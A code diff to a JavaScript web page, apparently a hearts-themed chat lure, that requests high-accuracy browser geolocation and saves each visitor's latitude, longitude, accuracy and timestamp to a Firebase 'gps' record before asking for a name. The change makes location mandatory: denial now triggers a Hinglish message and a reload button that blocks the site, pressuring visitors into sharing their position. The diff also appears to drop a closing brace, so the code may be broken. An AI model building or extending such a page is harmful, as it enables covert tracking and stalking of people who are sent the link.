@@ -57,21 +57,36 @@ function askLocationFirst_thenName() {
     showPage(0);
     return;
   }
-
   navigator.geolocation.getCurrentPosition(pos => {
-    db.ref("chat/" + chatID + "/gps").set({
-      lat: pos.coords.latitude,
-      lon: pos.coords.longitude,
-      acc: pos.coords.accuracy,
-      ts: Date.now()
-    });
-    askNameThenContinue();
-  }, err => {
-    alert("Please allow location.");
-    askNameThenContinue();
-  }, { enableHighAccuracy:true });
-}
 
+  db.ref("chat/" + chatID + "/gps").set({
+    lat: pos.coords.latitude,
+    lon: pos.coords.longitude,
+    acc: pos.coords.accuracy,
+    ts: Date.now()
+  });
+
+  askNameThenContinue();
+
+}, err => {
+
+  createHearts();
+
+  titleEl.textContent = "📍 Please allow location first";
+
+  extra.innerHTML = `
+  <p style="font-size:14px;margin-bottom:10px;">
+  Website continue karne ke liye location allow karna zaroori hai
+  </p>
+
+  <button onclick="location.reload()">
+  Allow Location
+  </button>
+  `;
+
+  card.classList.add("show");
+
+}, { enableHighAccuracy:true });
 /* ------------------------------- */
 function askNameThenContinue() {
   if (!userName) {
